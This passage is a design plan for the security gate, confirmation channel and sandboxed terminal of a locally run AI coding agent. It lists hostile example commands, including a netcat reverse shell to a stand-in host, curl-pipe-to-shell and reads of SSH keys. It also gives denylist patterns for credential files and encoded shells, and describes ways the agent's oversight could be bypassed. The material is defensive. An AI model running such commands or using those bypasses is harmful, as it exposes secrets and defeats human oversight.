---
id: docs.design-phase1-remainder
title: "Phase 1 — Remaining Build: Continuation Guide"
layer: operational
type: plan
status: active
owner: shared
created: 2026-07-12
updated: 2026-07-17
---

# Phase 1 — Remaining Build: Continuation Guide

*Authoritative build order and spec for the rest of Phase 1. You are implementing this autonomously on Toni's Windows PC (RTX 4070). The repo already has the Constitution, ADRs, DESIGN-phase1, and the working `git.status`/`fs.read`/security-gate/registry code. This document is law for the four PRs below; where it conflicts with the input designs, this document wins because it folds in the adversarial security reviews. Two things are Toni's call, not yours — they are marked **DECISION FOR TONI** and you must stop and ask before finalizing them.*

Ground truth you build against (verified from the code, not the design sketches):

- `gate.classify(cap, args, allowed_dirs) -> RiskClass` — three positional args.
- `gate.authorize(cap, args, *, allowed_dirs, confirm=None, remembered=None) -> Decision`; `confirm` is `Callable[[str], bool] | None`; **fail-closed** when `confirm is None`.
- `REMEMBERABLE = {RiskClass.MEDIUM}`; today `authorize` does `remembered.add(cap.name)` — **keyed by name** (a gap we fix in PR3).
- `_jail_escapes` inspects only `_PATH_KEYS` string values; `within_jail` compares on `.resolve()`d paths.
- `Registry.dispatch(name, args, ctx)` is the one choke point; **all** metrics (`dispatches`/`denied`/`errors`/`seconds`) are counted there. Denied → `Result(False, "Denied — …", {"denied": True, "risk": …})`.
- `Context(allowed_dirs, conversation_id=None, confirm=None, remembered=set())`.
- `agent_loop.run(cfg, registry, ctx, user_text, *, system_extra="", model_call=None, max_steps=None, max_seconds=None) -> AgentRun`; `_OBS_LIMIT = 4000`; **never raises**; the denied-Result string is already fed back to the model as the observation.
- `/api/agent` builds `Context(allowed_dirs=[project_dir], conversation_id=None, confirm=None)` — note `conversation_id=None` (matters for terminal session keying).
- `/api/chat` streams via `StreamingResponse(generate(), media_type="text/plain; charset=utf-8")` — the exact primitive PR3's SSE reuses.
- verify contract: `sys.path.insert` to repo root, `check(name, ok)` printing `OK`/`XX`, `FAILS` list, `main() -> int`, **exit 0 = pass / 2 = skip / else = fail**, auto-discovered by `verify_everything.py`'s `verify_*.py` glob.
- `config.py` has `_clamp(value, low, high)` (int only) and `_num(value, default, cast)`. New float keys need a float-clamp; add one (`_fclamp`) rather than misusing `_clamp`.

---

## 1. Order of work

Four PRs, one coherent change each, each runnable and verified on the PC before the next (Constitution §4, ADR-0007 "a new provider is a registration, not a loop change"):

| PR | Capability / feature | Risk | Ships confirmation-dependent? |
|----|----------------------|------|-------------------------------|
| **PR1** | `fs.list` | SAFE (jailed) | no |
| **PR2** | `git.log` | SAFE | no |
| **PR3** | **Confirmation UX** (SSE stream + Approve/Deny + the blocking confirm bridge) | — (no new capability) | **it is the channel** |
| **PR4** | `terminal.run` | MEDIUM floor, classified per command | **yes — blocked on PR3** |

**THE HARD RULE (non-negotiable, ADR-0005 / DESIGN §5 / DESIGN §6 / Constitution §5):**

> **No MEDIUM+ or write capability is registered as callable before the confirmation UX (PR3) is merged and verified on the PC.** The security gate is a *dependency of the tools, built before them*. `terminal.run` is the first MEDIUM+ capability, so it cannot ship before its human-in-the-loop channel exists.

The original task enumeration ("…terminal, then confirmation UX") is **inverted here on purpose.** Build order is fs.list → git.log → confirmation UX → terminal. `fs.write` (DESIGN §6 #5, MEDIUM) is the natural PR5 and also sits behind PR3; it is out of scope for this guide — do not bundle it in.

Rationale that binds you: with today's `confirm=None` on the non-streaming path, a MEDIUM+ capability that shipped before PR3 would be permanently fail-closed-denied (dead code) *or*, worse, tempt a shortcut that weakens the gate. Ship the channel first, then the power.

---

## 2. `fs.list` & `git.log` (PR1, PR2)

These are trivial, deterministic, read-only capabilities built to the `fs_read.py` / `git_status.py` pattern *exactly*. They are SAFE, so they never touch the confirmation machinery. Do not over-engineer them.

### Shared house rules (both files)

- `from __future__ import annotations` at the top.
- A model-readable `description`, a JSON-Schema `args_schema` with `"additionalProperties": False`, `risk = RiskClass.SAFE`, `provider = "builtin"`.
- `execute(self, args, ctx) -> Result` returns **only clean Results** on every branch and never raises: handle missing/kind-mismatch/permission explicitly, then a floor `except Exception as exc:  # noqa: BLE001 - contained; the loop observes it`.
- **No module-level `METRICS` dict.** Metrics are counted once at `Registry.dispatch`, exactly as `git_status.py` and `fs_read.py` do (which have none). Adding a local METRICS dict is a bug — do not.
- Bounded output so a huge dir/history can't blow the model's context; `loop.py`'s `_OBS_LIMIT=4000` is the second backstop.

### `fs.list` — `app/capabilities/builtin/fs_list.py`

- **Interface.** `name = "fs.list"`. One arg, **named `path`** (defaults to the jail root when absent). The name `path` is deliberate: it is in `gate._PATH_KEYS`, so the gate auto-jails it — an out-of-jail `path` escalates SAFE→HIGH and, with `confirm=None`, `authorize` denies fail-closed. **No jail logic lives in the capability; the gate owns it** (mirror `fs_read.py`).
- **Behaviour.** Resolve target under `ctx.allowed_dirs[0]`; if absent → list the jail root. Reject a missing dir (`ok=False`), reject a file with a "use fs.read" hint. List entries dirs-first, then name-insensitive. Each row: kind (`dir`/`file`), size (bytes; `-` for dirs), name (trailing `/` for dirs). Structured `data`: `{"path", "count", "truncated", "entries":[{"name","dir","size"}]}`.
- **Bounded.** `_MAX_ENTRIES = 100`; set `data["truncated"] = total > _MAX_ENTRIES` and append a `[... N more not shown ...]` note. Empty dir renders `(empty)`.
- **Compare on `.resolve()`d locations** (matches `fs_read`), so `..`/symlink escapes are caught by the gate and by the capability's own resolution.

### `git.log` — `app/capabilities/builtin/git_log.py`

- **Interface.** `name = "git.log"`. One optional arg `count` (integer, schema `minimum:1, maximum:50`, default 15). No path arg → no jail needed (identical posture to `git.status`), operates on `ctx.allowed_dirs[0]`.
- **Behaviour.** `git rev-parse --abbrev-ref HEAD` for the branch (this matches `state.observe()`'s branch — keep them consistent), then `git log -n<count> --pretty=format:"%h\x1f%s\x1f%cr\x1f%an"`. Unit-separator (`\x1f`) fields so a subject with spaces/pipes still parses; skip any row that doesn't split into exactly 4. Structured `data`: `{"branch","count","commits":[{"hash","subject","when","author"}]}`.
- **Defensive count.** Schema declares the bounds, but never trust the model: a `_coerce_count()` clamps junk to `max(1, min(50, int(value)))`, defaulting to 15 on `TypeError/ValueError` (mirrors `config._num`).
- **Empty repo is a valid OK state.** A fresh repo where `git log` exits non-zero returns `Result(True, "On branch <b>. No commits yet.", {...})` — mirror `git.status`'s "Working tree clean". Catch `FileNotFoundError` (no git → clean `ok=False`) and `subprocess.TimeoutExpired`.
- The `_git()` helper is **duplicated verbatim** from `git_status.py`. That is the house self-contained-per-file pattern; matching it is the point. **Do not** extract a shared `_git.py` in these PRs.

### Wiring — `app/capabilities/builtin/__init__.py`

Registration is the whole wiring change (ADR-0007). Import and register both; register the SAFE siblings next to their kin:

```python
def register_builtins(registry: Registry) -> None:
    registry.register(GitStatus())
    registry.register(GitLog())     # DESIGN §6 #2
    registry.register(FsRead())
    registry.register(FsList())     # DESIGN §6 #3
```

No `loop.py` change — that is the proof of ADR-0007.

### Done criteria (PR1, PR2)

- Both appear in `REGISTRY.specs()` / `GET /api/agent/capabilities` with `risk="safe"`, `provider="builtin"`, and a schema with `additionalProperties:false`. No `loop.py` diff.
- `verify_fs_list.py` (offline, temp dir, mirrors `verify_fs_read.py`) exits 0 asserting: registered; lists a jailed dir with names+kinds+sizes; empty dir → `(empty)`; a file path rejected with the fs.read hint; missing dir → `ok=False`; a >100-entry dir → `data["truncated"]` True and `data["count"]==150`; **and `dispatch fs.list {"path":"/etc"}` with `Context(confirm=None)` is denied** (`not ok`, `data["denied"]`, `data["risk"]=="high"`) — the jail proven through the registry, exactly like `verify_fs_read.py`'s `/etc/passwd` case.
- `verify_git_log.py` exits 0 (or **2/skip if `shutil.which("git") is None`**) asserting, in a throwaway `git init` repo with 3 commits: registered; newest-first with `data["count"]==3`; `count=1` → exactly one; each commit carries hash+subject+when+author; a fresh no-commit repo → `ok=True` "No commits yet"; a non-repo dir → clean `ok=False`.
- Neither file defines a module-level `METRICS` dict; both return clean Results on every branch. `verify_everything.py` auto-discovers both and stays green; `verify_capabilities.py`/`verify_security.py` unaffected.

---

## 3. The persistent terminal (PR4) — REVISED to close every critical/high finding

`terminal.run` is the first MEDIUM+ capability. It is registered through `register_builtins` so every command flows `dispatch → authorize → classify → execute` and cannot bypass the gate or metrics (ADR-0007). It holds a persistent shell per conversation behind a ConPTY (pywinpty on Windows), degrading to a stateless one-shot `subprocess` (with explicitly-tracked cwd) when no PTY is available — the existing optional-dep pattern (`tts`).

**The two adversarial reviews found this design shippable-unsafe as originally written.** The revisions below are mandatory. Each states the risk and exactly how the design now closes it.

### 3.1 The headline decision that closes the whole allowlist attack class

> **REVISED POSTURE (Phase 1): `terminal.run` has NO SAFE auto-run allowlist. Every non-empty command is MEDIUM floor, escalated to HIGH/CRITICAL by denylist, and NEVER de-escalated to SAFE.**

**Gap closed — CRITICAL (both reviews, finding 1) + CRITICAL (both reviews, finding 2):** the original `_SAFE_READ` leading-token allowlist auto-ran commands with no human, and its tokens were themselves execution/destruction primitives. Confirmed exploits that classified SAFE and would have run unconfirmed: `find . -delete`, `find . -exec sh -c … \;`, `env python evil.py`, `git log --output=/abs/path`, `cat /etc/passwd`, `cat ~/.ssh/id_dsa`, and newline/`&`/`<(` smuggling (`ls\nmake install`, `ls & nc evil 4444 -e /bin/sh`, `printf x\ncd /etc`).

**Because there is no SAFE path, all of those now hit the MEDIUM floor and require a human card (or are escalated higher).** With `confirm=None` on the non-streaming `/api/agent`, every real command is fail-closed denied; on the streaming path every command surfaces an Approve/Deny card showing the exact command string. This single decision eliminates leading-token laundering, newline smuggling, interpreter laundering (`python`, `bash`, `powershell -EncodedCommand`, `npm/pip install` postinstall), and reverse shells from ever auto-running.

**DECISION FOR TONI (blocking):** This posture means `git status`/`ls` also prompt the first time (rememberable per-command within a session — see §4). The design's open-question #3 offered the alternative of a *tiny, hardened* read-only allowlist. **Recommended default is zero-allowlist (above).** Do not ship an allowlist without Toni's explicit sign-off; if he wants one, it must be argument-shape-validated, reject `-exec`/`-delete`/`--output`/`-o`/redirection/subshell, and exclude `env`, `find`, `whoami`, `hostname`, `uname` (host-secret leakers, review 2 finding H3).

### 3.2 Per-command risk classification (`classify_command`)

A pure, testable `classify_command(command: str) -> RiskClass`. **Denylist wins; there is no SAFE branch.** Order: length-bound → CRITICAL → HIGH → structural escalations → **MEDIUM default**.

```python
def classify_command(command: str) -> RiskClass:
    cmd = (command or "").strip()
    if not cmd:
        return RiskClass.MEDIUM
    cmd = cmd[:4096]                      # ReDoS bound BEFORE any regex (review1 finding, medium)
    if any(p.search(cmd) for p in _CRITICAL):
        return RiskClass.CRITICAL
    if any(p.search(cmd) for p in _HIGH):
        return RiskClass.HIGH
    # a directory move is the ADR-0005 "confirmable cwd event" — HIGH.
    # NOTE the separator class includes newline and '&' (finding 2).
    if re.search(r"(^|[\n\r;&|]\s*)(cd|pushd|set-location|chdir)\b", cmd, re.I):
        return RiskClass.HIGH
    # any command naming an absolute path / .. / ~ / $HOME, or redirecting, is HIGH
    # (terminal is cwd-jailed, NOT path-jailed — see 3.3).
    if re.search(r"(^|\s)(/|~|\$HOME|\.\.[\\/])", cmd) or re.search(r"[>]|>&|&>|\$\(|`", cmd):
        return RiskClass.HIGH
    return RiskClass.MEDIUM               # floor; never SAFE
```

**`_CRITICAL`** (mass/irreversible destruction, disk, registry, credentials, remote-exec, encoded shells) — de-nest the `rm` quantifier to kill catastrophic backtracking (review1 ReDoS finding): `rm … -rf` at `/`,`~`,`$HOME`,`.`; `mkfs`; `dd … of=/dev/`; `diskpart|fdisk|parted`; fork bomb; `format [a-z]:`; `del /[sq] … [a-z]:\`; `rd /s`; PS `remove-item … -recurse -force [a-z]:\`; `reg delete|add hk…`; `remove-itemproperty … hklm`; `shutdown|reboot`; `(curl|wget|iwr|invoke-webrequest) … | (sh|bash|iex|invoke-expression)`; **reverse-shell markers** `/dev/tcp`, `\bnc(at)?\b.*-e`, `bash -i`; **encoded PowerShell** `-EncodedCommand|-enc\b|-e\s`; **credentials** `/etc/shadow`, `id_(rsa|dsa|ecdsa|ed25519)`, `*.pem`, `.aws/credentials`, `.ssh/`, `.kube/`, `.docker/config.json`, `.netrc`, `/proc/self/environ` (broadened per review1 H4 / review2 H3).

**`_HIGH`** — `rm|del|erase|remove-item`; `git push`; `git reset --hard`; `git clean -f[d]`; `git checkout … --force`; `mv|move`; `chmod|chown -R`; `kill|pkill|killall -9`; `taskkill /f`; `sudo|runas|doas`; redirect into system paths `>\s*/(etc|usr|bin|boot|dev|sys)`.

**Composition in the gate (`classify_args` hook, PR4 gate change):**

```python
def classify(cap, args, allowed_dirs) -> RiskClass:
    refine = getattr(cap, "classify_args", None)
    if callable(refine):
        try:
            risk = refine(args or {})
        except Exception:  # noqa: BLE001 - a broken classifier fails HIGH-ward, never trusts a de-escalation
            risk = _higher(cap.risk, RiskClass.HIGH)
    else:
        risk = cap.risk
    if _jail_escapes(args or {}, allowed_dirs):   # existing rule, unchanged — catches a `cwd` arg leaving the jail
        risk = _higher(risk, RiskClass.HIGH)
    return risk
```

Signature is unchanged, so `verify_security.py`/`verify_capabilities.py` (plain caps, no hook) behave exactly as before. A raising classifier fails **toward HIGH** — it can never silently downgrade. `TerminalRun.classify_args(args)` just calls `classify_command(str(args.get("command") or ""))`.

### 3.3 The jail — state it honestly, then enforce it

**Gap closed — HIGH (review1 finding 4 / review2 finding 4):** the project jail constrains only the process **cwd**, never the paths a command reads/writes. `cat /etc/passwd`, `grep -r secret /`, `echo x >> ~/.bashrc` are not path-jailed. The design must not claim otherwise.

The honest, enforced model, two deterministic layers:

1. **Pre-exec (classification).** Any command whose tokens contain an absolute path, `..`, `~`, `$HOME`, or a redirection is escalated to **HIGH** by `classify_command` (§3.2). A structured `cwd` arg leaving the jail is caught by the gate's existing `_jail_escapes` (`_PATH_KEYS`). So the human sees the exact command — including any out-of-jail path — **before** it runs (dry-run-first, ADR-0005). There is no SAFE bypass, so nothing out-of-jail runs unconfirmed.
2. **Post-exec (resting-cwd snapback), OS-authoritative.**

**Gap closed — HIGH (review1 finding 5) + MEDIUM (review2, `$PWD` parsing):** the original snapback trusted `$PWD`, a *mutable shell variable* an attacker can reassign (`cd /etc; PWD=/home/user/mbd-AI`), so the shell could rest outside the jail while reporting an in-jail cwd. **Fix: derive the resting cwd from the OS, never from `$PWD`.** POSIX: frame with `printf '\n%s %s %s\n' "$MARK" "$?" "$(pwd -P)"` (or read `/proc/<shell_pid>/cwd`); Windows PowerShell: `$($PWD.ProviderPath)`; cmd `%CD%` is acceptable (not user-assignable mid-line). Parse cwd as everything between nonce delimiters, not by whitespace-split (paths contain spaces). After each command, if the OS-read resting cwd is outside the jail, snap the session back to the jail root (`jail_snapbacks` metric) and set `sess.cwd = jail_root`. Because the escaping command was itself MEDIUM+ and confirmed, nothing unconfirmed ever ran outside; the snapback guarantees the *next* command starts in-jail.

The snapback `cd` is issued through a **dedicated internal backend method, not the model-facing `run()`**, and is shell-aware (`Set-Location` on PowerShell) — it must never carry model/args-derived content (review1 low finding).

### 3.4 Sessions — real keying, isolation, and a per-session lock

**Gap closed — MEDIUM (review1) + HIGH (review2 finding 4):** the original keyed sessions `conversation_id or 0`, and `/api/agent` passes `conversation_id=None`, collapsing every conversation onto **one global shell** (env, secrets, venvs, cwd bleed across conversations); `backend.run()` held **no lock**, so concurrent `to_thread` dispatches interleave writes/reads on one PTY.

**Fix:**
- PR3 already threads a real conversation id into `Context` (see §4.6). `terminal.run` keys sessions by `ctx.conversation_id`; **never fall back to a shared `0`** — use a per-process `uuid4()` sentinel when truly absent so two runs can never implicitly share a shell.
- Hold a **per-session `threading.Lock` around the entire `backend.run()`** (write + read), so dispatches on one session serialize. A second concurrent dispatch on a busy session queues or is rejected — it never interleaves.
- Add a close/reap hook (on `/api/new` and on idle timeout) so shells don't leak. **DECISION FOR TONI:** where the reaper lives (main.py shutdown vs a background reaper) and the idle TTL — see §6.

### 3.5 Timeout — clamp it and actually kill the command

**Gap closed — MEDIUM (both reviews):** the model-supplied `timeout` was unclamped (`float(args.get("timeout") or 120)`), so `1e18`/`nan` could park a worker thread ~forever; and the PTY backend *abandoned the read on timeout without killing the command*, leaving it running unattended and its late sentinel colliding with the next dispatch.

**Fix:**
```python
import math
t = args.get("timeout")
timeout = (_DEFAULT_TIMEOUT if not isinstance(t, (int, float)) or not math.isfinite(float(t)) or t <= 0
           else min(float(t), cfg.terminal_timeout_max))   # hard ceiling, clamped in config
```
On PTY timeout: send SIGINT/Ctrl-C to the pty; if the child doesn't yield, **recycle (kill + respawn) the shell** and mark the session degraded — nothing keeps running unattended. `_read_until_sentinel` must **skip any sentinel whose nonce ≠ the current command's nonce** (resync after a stale/abandoned command), and the nonce must be a full `uuid4().hex` (≥128-bit), not 8 chars. The one-shot degrade backend already kills on `TimeoutExpired`; bring the PTY path to parity.

### 3.6 Remember — terminal is never remembered

**Gap closed — HIGH (review1 finding 3 / finding 6):** remember keyed on `cap.name` makes `terminal.run` a universal auto-approver — one MEDIUM approve+remember would blanket-unlock every later MEDIUM command (`nc -e`, `pip install evil`, `echo x > ~/.bashrc`).

**Fix (implemented in PR3's gate change, §4.4):** `terminal.run` sets `rememberable = False`, and the gate's remember-key is `None` for non-rememberable caps, so it is **never** added to `remembered` and every command is individually confirmed. Interpreter/encoded commands (which classification cannot see through) are therefore always human-gated — the honest mitigation for "classification is best-effort surface detection."

### 3.7 The Capability interface

```python
class TerminalRun:
    name = "terminal.run"
    description = (
        "Run ONE shell command in the project's persistent terminal and observe its "
        "combined output, exit code, and current directory. The session persists across "
        "calls (env, cwd, activated virtualenvs are kept). Every command waits for your "
        "approval before running. One command per call — it never chains its own follow-ups."
    )
    args_schema = {
        "type": "object",
        "properties": {
            "command": {"type": "string", "description": "The single shell command to run."},
            "cwd":     {"type": "string", "description": "Optional dir to run in (must stay in the project jail)."},
            "timeout": {"type": "number", "description": "Optional seconds before the command is abandoned."},
        },
        "required": ["command"], "additionalProperties": False,
    }
    risk = RiskClass.MEDIUM          # honest floor shown in registry.specs(); effective risk via classify_args
    provider = "builtin"
    rememberable = False             # §3.6 — a universal executor is never auto-approved

    def classify_args(self, args: dict) -> RiskClass:
        return classify_command(str(args.get("command") or ""))
    def execute(self, args: dict, ctx: Context) -> Result: ...
```

- The PTY backend must **honor `cwd`** (run in `(cd <run_cwd> && <command>)` or drop the `cwd` arg entirely) — do not accept and gate-check a `cwd` the backend then ignores (review2 finding, medium). Recommended for Phase 1: **drop the `cwd` arg** and rely solely on the persistent, jail-confined session cwd; it removes a whole divergence class.
- **Bounded output:** `_MAX_OUTPUT_BYTES = 64_000` (head 48KB + tail 16KB, `[... N bytes elided ...]` in the middle); `loop.py` re-caps to 4000 chars — two-layer bounding like `fs.read`.
- `METRICS` dict is allowed here (matching `tts`): `commands`, `pty_spawns`, `degraded_runs`, `timeouts`, `jail_snapbacks`, `bytes`. Surface it in `/api/metrics` (`"terminal": terminal.METRICS`). (This is the one place a per-file METRICS is house style — the terminal owns backend state the registry can't see.)
- **Graceful degrade:** `_make_backend` tries `_PtyBackend`; on any exception (not Windows / no pywinpty / ConPTY unavailable) logs and returns `_SubprocessBackend`. Chat/agent never crash when the dep is missing.

### 3.8 How it is human-in-the-loop (by construction)

- MEDIUM is the floor for every real command → `gate.authorize` requires `ctx.confirm`. Non-streaming `/api/agent` (`confirm=None`) fail-closed denies all commands; streaming (PR3) surfaces one Approve/Deny card per command showing the **exact command string, effective risk, and why it was flagged** (a `flagged` field, e.g. "matched denylist: rm -rf").
- `execute()` runs **exactly one command per dispatch** and returns — no retry, no chained follow-up, no fix-the-build loop (Constitution §5, ADR-0005). The model may propose a next command; each is independently classified and gated.
- `terminal.run` is never rememberable → no command skips a card.
- Prompt-injection is contained (DESIGN §8): tool output is data, labeled `$ cmd / exit / cwd`, never elevated to instructions; MEDIUM+ needs the human regardless of what the model "decided."

### 3.9 Done criteria (PR4)

- `verify_terminal.py` exits 0 on Linux (degrade path) and on the PC (PTY path); **2/skip** when neither pywinpty nor `os.openpty` is available, with a HINT (like `verify_tts`/`verify_agent`).
- Registered; `specs()` lists it `risk="medium"` with its schema; no `loop.py` change.
- **`classify_command` battery:** `rm -rf /`→CRITICAL, `dd … of=/dev/sda`→CRITICAL, `curl x|sh`→CRITICAL, `powershell -enc …`→CRITICAL, `nc -e /bin/sh h 4444`→CRITICAL, `git push`→HIGH, `rm foo`→HIGH, `cd /etc`→HIGH, `cat /etc/passwd`→HIGH, `echo hi > f`→HIGH, `ls\nmake install`→HIGH (newline separator), `git status`→MEDIUM (no SAFE branch), `make build`→MEDIUM; denylist-wins (`git status; rm -rf .`→CRITICAL); a 40k-char `rm ` + dashes classifies fast (ReDoS bound).
- **Gate via registry:** a HIGH/CRITICAL command with `Context(confirm=None)` → `not ok`, `data["denied"]`, and a spy backend proves `execute` never ran it; adversarial battery (`rm -rf /`, `git push`, `curl|sh`, `cd /etc`, `; rm` chaining, newline smuggling) → **0 escapes**.
- **Persistence** (PTY path, guarded): `export NERO_X=1` in call 1, read it back in call 2 on the same `conversation_id`; degrade path documents no persistence and threads cwd explicitly.
- **OS-authoritative snapback:** approve `cd /` → `data["cwd_escaped"]` True, `sess.cwd` back inside the jail, `jail_snapbacks` bumped; a `PWD=<fake>` injection cannot fool it.
- **Concurrency:** two overlapping dispatches on one session serialize (lock), output never interleaves.
- **Timeout:** a `nan`/huge timeout is clamped; a PTY timeout kills/recycles the child; a >64KB command returns head+tail with the elision marker.
- Existing `verify_security.py`, `verify_capabilities.py`, `verify_agent.py`, `verify_fs_read.py` stay green (the `classify_args` hook is additive; plain caps unaffected).

---

## 4. The confirmation UX (PR3) — REVISED to close every critical/high finding

The pause/resume is achieved **without** rewriting the loop as an async state machine. The loop already runs synchronously inside `asyncio.to_thread` (main.py `/api/agent`), and the gate already invokes `ctx.confirm`. "Suspend awaiting a human" = `ctx.confirm` blocks the *worker thread* on a `threading.Event`; resume = `event.set()` from a separate decision request. The block is in a threadpool thread, so the server event loop stays free to serve the stream and the decision POST. This is Least-Intelligence (don't build coroutine suspension) and strangler-fig (the loop's control flow is untouched).

### 4.1 Transport — SSE, not WebSocket

Server→client is a one-way stream (step trace, confirm events, final answer); client→server decisions are rare discrete POSTs. That maps to `StreamingResponse` with `text/event-stream` framing (the exact primitive `/api/chat` uses) for the stream, plus a plain idempotent `POST /api/agent/decision`. WebSocket buys nothing here (local, single-user, one process), costs a second protocol, and trades away the single debuggable HTTP stack the Constitution values (§3, §5). **DECISION FOR TONI (blocking): confirm SSE-vs-WebSocket before building §4.6.** Recommended: SSE. Revisit only if token-level barge-in is ever needed (YAGNI now).

Because the request carries a body (`{message}`), the browser cannot use `EventSource` (GET-only); the client reads `resp.body.getReader()`, buffers on `\n\n`, and parses `event:`/`data:` frames — reusing `/api/chat`'s reader loop.

### 4.2 The suspend/resume bridge — `app/agent/channel.py` (NEW)

A `RunChannel` per streamed run, holding an `asyncio.Queue` of events (drained by the SSE generator on the event loop) and a dict of pending `Confirmation`s (each a `threading.Event`). The core rendezvous, run on the **worker thread**:

```python
def request_confirm(self, *, tool, args, risk, preview, detail, timeout) -> tuple[bool, bool]:
    c = Confirmation(uuid.uuid4().hex, tool, args, risk, preview, detail)
    with self._lock:
        if self._closed:
            return (False, False)                 # fail-closed
        self._pending[c.id] = c
    self.emit({"event": "confirm", "id": c.id, "tool": tool, "args": args,
               "risk": risk, "preview": preview, "detail": detail})
    got = c._event.wait(timeout)                  # <-- the loop SUSPENDS here (worker thread only)
    with self._lock:
        self._pending.pop(c.id, None)
    if not got:
        self.emit({"event": "confirm_timeout", "id": c.id})
        return (False, False)                     # timeout ⇒ deny
    return (c.approved, c.remember)
```

`emit()` hops onto the loop via `self._loop.call_soon_threadsafe(self._events.put_nowait, event)`. `resolve(id, approved, remember)` (called on the event loop by the decision endpoint) sets the Event; an unknown id is a safe no-op. `close()` sets `_closed` and resolves every pending confirmation as **denied** so no worker thread is left parked. `METRICS` (`requested`/`approved`/`denied`/`timeouts`/`remembered_hits`/`wait_seconds`) surface in `/api/metrics`.

### 4.3 Loop change — additive, keyword-only

`loop.run` gains three optional keyword params, all defaulting to a no-op so existing callers and `verify_agent` are unaffected:

```python
def run(cfg, registry, ctx, user_text, *, system_extra="", model_call=None,
        max_steps=None, max_seconds=None,
        on_event=None,               # emit step/observation events (SSE)
        paused_seconds=None,         # confirm-wait excluded from the THINK budget
        should_continue=None):       # <-- NEW: cancellation (closes review1 finding H2)
```

- `emit = on_event or (lambda _e: None)`.
- Before dispatching each step, emit `{"event":"step", ...}`; after, emit `{"event":"observation", ...}`.
- The **deny path needs zero new loop code**: a denied dispatch already returns `Result(False, "Denied — … denied by human.", {"denied":True})`, and the loop already feeds that string back to the model as the observation. "Feed 'user denied' to the model" *is* the existing denied-Result path, now triggered by a real human.

**Gap closed — HIGH (review1 finding 2): client disconnect drains the loop headless while remembered MEDIUM actions keep executing.** Fix: check `should_continue()` at the **top of each step**, before `registry.dispatch`; when it returns False, stop with `stopped_reason="cancelled"`. The endpoint wires `should_continue=lambda: not channel._closed`, so on disconnect the loop halts before the next dispatch — no capability runs with the human gone. Also short-circuit `channel.emit` when `_closed` so the undrained queue can't grow during a headless run.

**Gap closed — MEDIUM (review1): total wall-clock unbounded.** `paused_seconds` (= cumulative confirm-wait) is subtracted from the *think* budget only, so a slow legitimate click isn't aborted. But keep an **absolute** kill independent of it: also stop if `(now - started) > max_seconds + max_confirm_budget` (a small fixed allowance), or abort after N consecutive confirm timeouts. Excluding human-wait from the think budget is fine; excluding it from the absolute budget is what let a thread park for tens of minutes.

### 4.4 The gate change (PR3) — structured confirm + signature-keyed, MEDIUM-only remember

**Gap closed — CRITICAL (both reviews, finding 1): remember keyed on `cap.name` blanket-unlocks a whole tool.** One approve+remember of `fs.write(README.md)` would auto-approve `fs.write(config.yaml)` (which *defines the jail*), `fs.write(app/security/gate.py)`, `.git/hooks/pre-commit`, etc.

**Fix — remember on a canonical signature, not the bare name, MEDIUM-only, opt-in only:**

```python
@dataclass
class ConfirmRequest:
    tool: str; args: dict; risk: RiskClass; preview: str
    remember: bool = False               # the callback sets True iff the human opted in
    def __str__(self) -> str: return self.preview   # any string-treating caller still works

def _remember_key(cap, args, allowed_dirs) -> str | None:
    if not getattr(cap, "rememberable", True):       # terminal.run opts out ⇒ never remembered
        return None
    for k in _PATH_KEYS:                              # path caps: key on the RESOLVED target
        v = args.get(k)
        if isinstance(v, str) and v.strip():
            r = _resolve(v, allowed_dirs)
            return f"{cap.name}:{r}" if r else None
    return cap.name                                  # no path arg ⇒ whole-cap key (e.g. a future arg-less MEDIUM)

# in authorize():
risk = classify(cap, args or {}, allowed_dirs)
if risk == RiskClass.SAFE:
    return Decision(True, risk, False, "safe — auto-approved")
key = _remember_key(cap, args or {}, allowed_dirs)
if risk in REMEMBERABLE and key and remembered and key in remembered:
    return Decision(True, risk, True, "approved (remembered this session)")
if confirm is None:
    return Decision(False, risk, True, "requires confirmation; none available")
req = ConfirmRequest(cap.name, dict(args or {}), risk, _preview(cap, args or {}, risk))
try:
    approved = bool(confirm(req))
except Exception:  # noqa: BLE001 - a raising callback denies, never 500s the run (review1 medium)
    approved = False
if approved and req.remember and risk in REMEMBERABLE and key and remembered is not None:
    remembered.add(key)
return Decision(approved, risk, True, "approved by human" if approved else "denied by human")
```

MEDIUM-only remember is enforced in **two** independent places (defense in depth): the endpoint sets `req.remember=True` only for `RiskClass.MEDIUM`; the gate adds only when `req.remember and risk in REMEMBERABLE`. HIGH/CRITICAL can never enter `remembered`, and the consult also requires `risk in REMEMBERABLE`. Existing test lambdas `confirm=lambda _p: True` ignore the arg and stay green (`str(req)` is the preview).

**Gap closed — HIGH (review1 finding 3): the jail protects the directory but not the files that DEFINE it.** `config.yaml` holds `agent_project_dir`; `app/security/gate.py`, `.git/hooks/*` are all in-jail, so an in-jail MEDIUM `fs.write` could rewrite the sandbox or the gate itself. **Fix — escalate writes/commands touching self-governing paths to HIGH** (never rememberable), regardless of jail membership:

```python
# in classify(), after the jail-escape rule:
if _touches_sensitive(args or {}, allowed_dirs):     # resolved config*.yaml, app/security/**, .git/hooks/**, dotfiles
    risk = _higher(risk, RiskClass.HIGH)
```

The card then shows HIGH and it can never be auto-approved by remember.

### 4.5 The preview hook — pure, jail-confined, no leaks

**Gap closed — HIGH (review2 finding 2): the preview hook is an ungated, side-effect-capable FS read on model args that runs before approval and streams outside the jail.** An `fs.write` diff reads the existing target; if the model targets `/etc/passwd`, the diff's "before" side reads and streams it *before* the human denies.

**Fix — pin the contract and gate the call:**
- `Capability.preview(args, ctx) -> dict | None` **must be pure and side-effect-free**: no writes, **no process execution**, reads confined to `ctx.allowed_dirs` (call `within_jail` on the resolved target before any read), bounded output. It is a *preview*, never a dry-run that executes.
- The endpoint calls `preview` **only when the args do not escape the jail** (`not gate._jail_escapes(req.args, ctx.allowed_dirs)`). On escape, `detail = {"kind":"jail-escape","resolved": str(_resolve(target, allowed_dirs))}` with **no file contents**.
- `fs.write` diff is **bounded** (first-N-lines / summary), not a full unified diff, to keep the card and SSE frame small (DECISION FOR TONI at fs.write time; lean bounded). Best-effort try/except so a preview failure never breaks the flow.

### 4.6 Endpoints — `app/main.py` (additive; `/api/agent` UNCHANGED)

```python
_CHANNELS: dict[int, RunChannel] = {}

@app.post("/api/agent/stream")
async def agent_stream(payload: AgentIn) -> StreamingResponse:
    ...  # 400 if empty, 403 if not cfg.agent_enabled
    conv_id = db.get_or_create_active_conversation()          # a REAL id — never None/0 (review2 H4)
    # --- single-flight (closes review1 finding H5) ---
    old = _CHANNELS.get(conv_id)
    if old is not None:
        old.close()                                           # supersede a double-submit; deny its pendings
    channel = RunChannel(conv_id, asyncio.get_running_loop())
